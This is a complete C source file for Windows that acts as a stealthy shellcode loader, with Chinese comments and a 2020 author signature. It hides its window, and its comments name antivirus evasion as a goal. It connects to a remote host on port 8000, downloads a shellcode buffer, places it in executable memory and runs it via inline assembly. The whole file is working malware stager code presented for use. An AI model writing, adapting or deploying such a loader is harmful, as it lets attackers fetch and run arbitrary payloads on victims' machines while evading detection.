#include <stdio.h>
#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable:4996)
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//运行时不显示窗口
#pragma comment(linker, "/section:.data,RWE") //呼叫汇编执行shellcode（免杀）
//Wirtten by Hacden 2020/03/10
int main(int argc,char *argv[])
{
	int sPort = 8000;
	WSADATA wsd;
	SOCKET sHost;
	SOCKADDR_IN servAddr;
	char bufRecv[5000];
	DWORD dwThreadId;
	HANDLE hThread;
	int Rset;
	int BUF_SIZE = 5000;



	Rset = (WSAStartup(MAKEWORD(2, 2), &wsd));
	if (Rset != 0)
	{
		printf("WSAStartup is error %d\n", Rset);
		return 0;
	}
	sHost = socket(AF_INET, SOCK_STREAM, 0);
	if (INVALID_SOCKET == sHost)
	{
		printf("socket failed with error %d\n", WSAGetLastError());
		WSACleanup();
		return 0;
	}

	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.S_un.S_addr = inet_addr(argv[1]);
	servAddr.sin_port = htons(sPort);
	/*printf("Will connect to server %s:%d\n", inet_ntoa(servAddr.sin_addr), htons(servAddr.sin_port));*/

	Rset = connect(sHost, (SOCKADDR*)&servAddr, sizeof(servAddr));
	if(Rset == SOCKET_ERROR)
	{
		printf("socket failed %d\n", WSAGetLastError());
		WSACleanup();
		return 0;
	}
	send(sHost, "connect ok\n",10, 0);

	//内存清零初始化
	ZeroMemory(bufRecv, BUF_SIZE);
	Sleep(2000);
	//接收shellcode
	recv(sHost, bufRecv, BUF_SIZE, 0);

	//printf("starting load shellcod");
	//printf("connect ok....\n");
	Sleep(4000);
	closesocket(sHost);
	WSACleanup();



	//申请内存地址并shellcode指针
	char* shellcode = (char*)VirtualAlloc(
		NULL,
		BUF_SIZE,
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	);
	CopyMemory(shellcode, bufRecv, BUF_SIZE);


	//执行shellcode
	__asm
	{
		call shellcode
		
	}
	//或者这样执行
	//hThread = CreateThread(
	//	NULL,
	//	NULL,
	//	(LPTHREAD_START_ROUTINE)shellcode,
	//	NULL,
	//	NULL,
	//	&dwThreadId
	//);

	//WaitForSingleObject(hThread, INFINITE);

	return 0;


}
